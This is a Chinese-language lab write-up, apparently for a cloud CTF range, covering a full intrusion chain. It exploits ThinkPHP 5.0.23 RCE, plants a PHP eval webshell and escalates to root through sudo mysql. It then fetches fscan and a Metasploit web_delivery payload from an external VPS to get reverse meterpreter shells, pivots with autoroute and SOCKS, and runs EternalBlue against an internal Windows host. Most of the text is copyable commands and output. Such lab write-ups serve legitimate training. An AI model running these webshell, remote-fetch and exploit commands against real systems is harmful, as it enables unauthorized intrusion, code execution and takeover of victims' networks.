+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408210709319.png" alt="file-20260408210709319"></p>
+<p>版本号为 V5.0.23，Google 搜索一下 N-Day：</p>
+<p>Dork：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V5.0.23 AND ThinkPHP AND Poc</span><br></pre></td></tr></table></figure>
+
+<p>找到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.md</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408212633645.png" alt="file-20260408212633645"></p>
+<p>响应：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408212733783.png" alt="file-20260408212733783"></p>
+<p>RCE 验证成功。</p>
+<h3 id="4、写入一句话木马"><a href="#4、写入一句话木马" class="headerlink" title="4、写入一句话木马"></a>4、写入一句话木马</h3><p>通过 Webshell 写入一句话木马，准备蚁剑连接。</p>
+<p>先确认写入的为止，通过命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>
+
+<p>得知目前处于：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/</span><br></pre></td></tr></table></figure>
+
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">robots.txt</span><br><span class="line">router.php</span><br><span class="line">static</span><br></pre></td></tr></table></figure>
+
+<p>这就是我们之前扫描在根目录下发现的，换言之，我们只需要在 <code>/var/www/html</code> 目录中写入 <code>shell.php</code>，即可在根目录下访问该文件了。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_REQUEST[&quot;x&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里有个坑，不要将命令写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_REQUEST[&#x27;x&#x27;]);?&gt;&quot; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>我们在自己终端中可以尝试这条命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_REQUEST[&#x27;x&#x27;]);?&gt;&quot; &gt; /tmp/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>按道理说，<code>shell.php</code> 文件中应该写入了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;x&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❯ echo &quot;&lt;?php @eval($_REQUEST[&#x27;x&#x27;]);?&gt;&quot; &gt; /tmp/shell.php</span><br><span class="line">zsh: bad math expression: operand expected at `&#x27;x&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>报错了，为什么呢？</p>
+<p>很简单，在 zsh（以及 bash）中，双引号 <code>&quot;...&quot;</code> 内 <code>$</code> 会触发变量展开，所以 <code>$_REQUEST</code> 被当作变量名解析，而 <code>[&#39;x&#39;]</code> 中的方括号又触发了数学表达式求值，最终报错。</p>
+<p>解决方法就是用单引号包裹：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_REQUEST[&quot;x&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>单引号内 shell 不做任何展开，内容原样写入。</p>
+</blockquote>
+<h3 id="5、蚁剑连接"><a href="#5、蚁剑连接" class="headerlink" title="5、蚁剑连接"></a>5、蚁剑连接</h3><p>信息：</p>
+<ul>
+<li>网址：<code>http://39.99.151.82/shell.php</code></li>
+<li>密码：x</li>
+</ul>
+<p>连接成功：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260408214710164.png" alt="file-20260408214710164"></p>
+<p>目前我们是 www-data 用户，权限很低，先简单信息搜集一下，后续找一下提权的方法：</p>
+<h4 id="（1）信息搜集"><a href="#（1）信息搜集" class="headerlink" title="（1）信息搜集"></a>（1）信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:28:42:13 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 1892154016sec preferred_lft 1892154016sec</span><br><span class="line">    inet6 fe80::216:3eff:fe28:4213/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>可以发现：</p>
+<ul>
+<li>本机的内网 IP：<code>172.22.1.15</code></li>
+<li>内网网段：<code>172.22.0.0/16</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ hostname &amp;&amp; cat /etc/issue &amp;&amp; uname -a &amp;&amp; cat /etc/hosts</span><br><span class="line">ubuntu-web01</span><br><span class="line">Ubuntu 20.04.4 LTS \n \l</span><br><span class="line">Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">127.0.0.1    localhost</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1    localhost    ip6-localhost    ip6-loopback</span><br><span class="line">ff02::1    ip6-allnodes</span><br><span class="line">ff02::2    ip6-allrouters</span><br><span class="line">127.0.1.1    s02g07017.cloud.em160.tbsite.net    s02g07017</span><br><span class="line">172.22.1.15    ubuntu-web01    ubuntu-web01</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>架构：x86_64</li>
+<li>OS：Ubuntu</li>
+</ul>
+<p>查看内核的具体版本信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">cat</span> /proc/version</span><br><span class="line">Linux version 5.4.0-110-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) <span class="comment">#124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022</span></span><br></pre></td></tr></table></figure>
+
+<p>查看路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ ip route show</span><br><span class="line">default via 172.22.255.253 dev eth0 proto dhcp src 172.22.1.15 metric 100 </span><br><span class="line">172.22.0.0/16 dev eth0 proto kernel scope link src 172.22.1.15 </span><br><span class="line">172.22.255.253 dev eth0 proto dhcp scope link src 172.22.1.15 metric 100 </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>scope link 表示直连，说明本机直连内网环境（172.22.0.0&#x2F;16）</li>
+<li>default 表示默认路由（其他路由都不匹配的时候走这条），判断 172.22.255.253 应该就是内网的网关了</li>
+</ul>
+<h4 id="（2）提权"><a href="#（2）提权" class="headerlink" title="（2）提权"></a>（2）提权</h4><p>找找提权的相关信息：</p>
+<ul>
+<li>sudo</li>
+<li>SUID</li>
+<li>PATH</li>
+<li>……</li>
+</ul>
+<p>运气也是比较好，sudo 就是本题的正解。</p>
+<p>过程如下：</p>
+<p>先查看 sudo 列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>
+
+<p>无需密码即可使用 <code>mysql</code> 命令，通过网站（<code>https://gtfobins.org/</code>）查询提权命令：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409093653245.png" alt="file-20260409093653245"></p>
+<p>当然，我们无法直接通过 Webshell 返回一个 root 用户的终端，因为蚁剑、冰蝎这类 Webshell 管理工具它们只是模拟了一个类似终端的界面，本质还是通过 Webshell，一句命令，一句回显，无法实现交互式的命令。</p>
+<p>网站给的 payload 即：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>就是通过 mysql 执行一个系统命令 <code>/bin/sh</code>，在正常终端就会返回 sh 这个 shell 的交互式界面，但是 Webshell 中就会失败。</p>
+<p>但是，既然 mysql 具有 sudo 权限，即我们在 mysql 中执行的命令就是 root 权限执行的，因此无需追求交互式，只要命令执行，并且能回显就可以了。</p>
+<p>测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ sudo /usr/bin/mysql -e &#x27;\! whoami&#x27;</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>提权成功，并且能执行命令。</p>
+<h2 id="四、Fscan-内网信息搜集"><a href="#四、Fscan-内网信息搜集" class="headerlink" title="四、Fscan 内网信息搜集"></a>四、Fscan 内网信息搜集</h2><h3 id="1、上传-Fscan"><a href="#1、上传-Fscan" class="headerlink" title="1、上传 Fscan"></a>1、上传 Fscan</h3><p>上传 Fscan 打算收集内网的信息。</p>
+<p>现在有个问题，目标是公网，我是学校私网环境，如何在我攻击机上下载 fscan 呢？</p>
+<p>我刚好有一台未过期的 VPS，防火墙开放 4444 端口，建立反向代理：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -R 0.0.0.0:4444:localhost:4444 &lt;user&gt;@&lt;VPS_IP&gt; -N</span><br></pre></td></tr></table></figure>
+
+<p>这个命令意思是，只要是连接 vps 的 4444 端口都会映射到我本地的 4444 端口。</p>
+<p>在攻击机的 fscan 目录（我这里是 <code>/usr/local/bin</code>）下，用 python 开启简易 http 服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ python -m http.server 4444</span><br><span class="line">Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...</span><br></pre></td></tr></table></figure>
+
+<p>在蚁剑上执行 wget 命令下载 fscan：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://&lt;vps_ip&gt;:4444/fscan</span><br></pre></td></tr></table></figure>
+
+<p>下载成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ ls</span><br><span class="line">favicon.ico</span><br><span class="line">fscan</span><br><span class="line">index.php</span><br><span class="line">robots.txt</span><br><span class="line">router.php</span><br><span class="line">shell.php</span><br><span class="line">static</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限（注意，赋予执行权限可能需要 root 权限，用之前的提权命令）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/mysql -e &#x27;\! chmod +x fscan&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、上线-MSF"><a href="#2、上线-MSF" class="headerlink" title="2、上线 MSF"></a>2、上线 MSF</h3><p>fscan 扫描需要时间，而 webshell 执行命令本质上是一次性的 HTTP 请求，请求结束进程就被杀掉，根本等不了很长的时间。</p>
+<p>经过尝试，理论上可以通过 sudo–mysql 提权直接返回一个 root 用户的 session，但是失败次数比成功次数多，因此打算先获得 www-data 的 shell，提权后再获得 root 的 shell。</p>
+<p>使用 MSF 的 <code>multi/script/web_delivery</code> 模块：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target PHP</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST &lt;VPS_IP&gt;</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> SRVPORT 6666</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意也需要配置 VPS 反向代理，并且开放防火墙。</p>
+</blockquote>
+<p><code>run</code> 之后就能得到命令，复制到之前的蚁剑终端或者直接 Burp POST 传输都可以，执行成功后会获得一个 www-data 用户的 session：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/script/web_delivery) &gt; run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[-] Handler failed to <span class="built_in">bind</span> to 118.31.3.148:4444:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444 </span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; [*] Using URL: http://118.31.3.148:6666/2pHiURSe</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">php -d allow_url_fopen=<span class="literal">true</span> -r <span class="string">&quot;eval(file_get_contents(&#x27;http://118.31.3.148:6666/2pHiURSe&#x27;, false, stream_context_create([&#x27;ssl&#x27;=&gt;[&#x27;verify_peer&#x27;=&gt;false,&#x27;verify_peer_name&#x27;=&gt;false]])));&quot;</span></span><br><span class="line">[*] 127.0.0.1        web_delivery - Delivering Payload (1113 bytes)</span><br><span class="line">[*] Sending stage (42137 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:35504) at 2026-04-09 16:14:56 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information              Connection</span><br><span class="line">  --  ----  ----                   -----------              ----------</span><br><span class="line">  1         meterpreter php/linux  www-data @ ubuntu-web01  127.0.0.1:4444 -&gt; 127.0.0.1:35504 (127.0.0.1)</span><br></pre></td></tr></table></figure>
+
+<p>进入该 session：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
+
+<p>切换成 shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p>查看是否有 paython：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 --version</span><br><span class="line">Python 3.8.10</span><br></pre></td></tr></table></figure>
+
+<p>可以用 python 实施 shell 稳定化操作，输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409162240499.png" alt="file-20260409162240499"></p>
+<p>提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409162329742.png" alt="file-20260409162329742"></p>
+<p>提权成功。</p>
+<p>现在就可以重复之前的操作返回一个 root 用户的 session 了。</p>
+<p>这里省略相关步骤，因为步骤是重复的。</p>
+<p>直接上结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/script/web_delivery) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information          Connection</span><br><span class="line">  --  ----  ----                   -----------          ----------</span><br><span class="line">  1         meterpreter x64/linux  root @ ubuntu-web01  127.0.0.1:6667 -&gt; 127.0.0.1:42104 (127.0.0.1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、内网扫描"><a href="#3、内网扫描" class="headerlink" title="3、内网扫描"></a>3、内网扫描</h3><p>通过之前的信息搜集，我们知道这台主机是拥有内网的直连路由的，所以直接用之前上传的 fscan 扫描即可，命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fscan -h 172.22.0.0/16 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fscan -h 172.22.0.0/16   </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.1.15     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.1.2      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.1.18     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.1.21     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.255.253  is alive</span></span><br><span class="line"><span class="string">[*] LiveTop 172.22.0.0/16    段存活数量为: 5</span></span><br><span class="line"><span class="string">[*] LiveTop 172.22.1.0/24    段存活数量为: 4</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 5</span></span><br><span class="line"><span class="string">[*] LiveTop 172.22.255.0/24  段存活数量为: 1</span></span><br><span class="line"><span class="string">172.22.1.18:80 open</span></span><br><span class="line"><span class="string">172.22.1.21:445 open</span></span><br><span class="line"><span class="string">172.22.1.18:445 open</span></span><br><span class="line"><span class="string">172.22.1.2:445 open</span></span><br><span class="line"><span class="string">172.22.1.21:139 open</span></span><br><span class="line"><span class="string">172.22.1.2:139 open</span></span><br><span class="line"><span class="string">172.22.1.18:139 open</span></span><br><span class="line"><span class="string">172.22.1.21:135 open</span></span><br><span class="line"><span class="string">172.22.1.18:135 open</span></span><br><span class="line"><span class="string">172.22.1.2:135 open</span></span><br><span class="line"><span class="string">172.22.1.2:88 open</span></span><br><span class="line"><span class="string">172.22.1.18:3306 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 12</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.1.2</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.1.2</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.1.21</span></span><br><span class="line"><span class="string">   [-&gt;]XIAORANG-WIN7</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.1.21</span></span><br><span class="line"><span class="string">[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.1.18</span></span><br><span class="line"><span class="string">   [-&gt;]XIAORANG-OA01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.1.18</span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span></span><br><span class="line"><span class="string">已完成 12/12</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 14.805592089s</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>172.22.255.253 就是我们之前分析出的路由，不把他列为分析对象。</p>
+</blockquote>
+<h4 id="（1）172-22-1-21"><a href="#（1）172-22-1-21" class="headerlink" title="（1）172.22.1.21"></a>（1）172.22.1.21</h4><p>端口开放情况：</p>
+<ul>
+<li>445</li>
+<li>135</li>
+<li>139</li>
+</ul>
+<p>主机名：XIAORANG-WIN7</p>
+<p>$\to$ 说明是一个域环境。</p>
+<p>关键：fscan 的漏洞扫描得到该主机存在 MS-010（永恒之蓝漏洞）</p>
+<p>域名：xiaorang.lab</p>
+<p>OS 指纹信息：Windows Server 2008 R2 Enterprise 7601 Service Pack 1</p>
+<h4 id="（2）172-22-1-18"><a href="#（2）172-22-1-18" class="headerlink" title="（2）172.22.1.18"></a>（2）172.22.1.18</h4><p>端口开放情况：</p>
+<ul>
+<li>80（扫描结果还显示，这是一个“信呼协同办公系统”，是一个）</li>
+<li>139</li>
+<li>135</li>
+<li>445</li>
+<li>3306</li>
+</ul>
+<p>主机名：XIAORANG-OA01</p>
+<p>域名：xiaorang.lab</p>
+<p>OS 指纹信息：Windows Server 2012 R2 Datacenter 9600</p>
+<h4 id="（3）172-22-1-2"><a href="#（3）172-22-1-2" class="headerlink" title="（3）172.22.1.2"></a>（3）172.22.1.2</h4><p>是域控（DC:DC01.xiaorang.lab）</p>
+<p>主机名：DC01</p>
+<p>端口开放情况：</p>
+<ul>
+<li>445</li>
+<li>80</li>
+<li>88</li>
+<li>135</li>
+<li>139</li>
+</ul>
+<p>OS 指纹： Windows Server 2016 Datacenter 14393</p>
+<h3 id="4、画图建议"><a href="#4、画图建议" class="headerlink" title="4、画图建议"></a>4、画图建议</h3><p>随着主机的越来越多，靠脑子和电子笔记记录有点不太够用了，建议画图，我这里用的是 Obsidian<br>的 Excalidraw 插件：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409165945729.png" alt="file-20260409165945729"></p>
+<h2 id="五、MS17-010"><a href="#五、MS17-010" class="headerlink" title="五、MS17-010"></a>五、MS17-010</h2><p>既然扫描出漏洞，而且是高危，他的优先级肯定是最高的，在利用之前，先建立内网路由和代理。</p>
+<h3 id="1、建立路由和代理"><a href="#1、建立路由和代理" class="headerlink" title="1、建立路由和代理"></a>1、建立路由和代理</h3><p>路由：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.22.0.0/16</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 172.22.0.0/255.255.0.0...</span><br><span class="line">[+] Added route to 172.22.0.0/255.255.0.0 via 127.0.0.1</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure>
+
+<p>socks 5 代理：</p>
+<p>先退回到 <code>msf&gt;</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br></pre></td></tr></table></figure>
+
+<p>建立代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/script/web_delivery) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1 </span><br><span class="line">SRVHOST =&gt; 127.0.0.1</span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; set SRVPORT 1080</span><br><span class="line">SRVPORT =&gt; 1080</span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; set VERSION 5 </span><br><span class="line">VERSION =&gt; 5</span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; run -j  </span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; job</span><br><span class="line">[*] Starting the SOCKS proxy server</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、使用永恒之蓝模块"><a href="#2、使用永恒之蓝模块" class="headerlink" title="2、使用永恒之蓝模块"></a>2、使用永恒之蓝模块</h3><p>接下来就是模块打永恒之蓝：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+
+<p>并且我们采用 bind shell 的方式（因为内网无回连我们攻击机的路由）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload payload/windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.22.1.21</span><br></pre></td></tr></table></figure>
+
+<p><code>run</code> 之后就能得到该主机的 meterpreter shell 了。</p>
+<blockquote>
+<p>永恒之蓝本身就不是很稳定，有几率让目标蓝屏，因此如果不行的话可以多尝试几次。</p>
+</blockquote>
+<p>查看权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p>直接就是最高权限。</p>
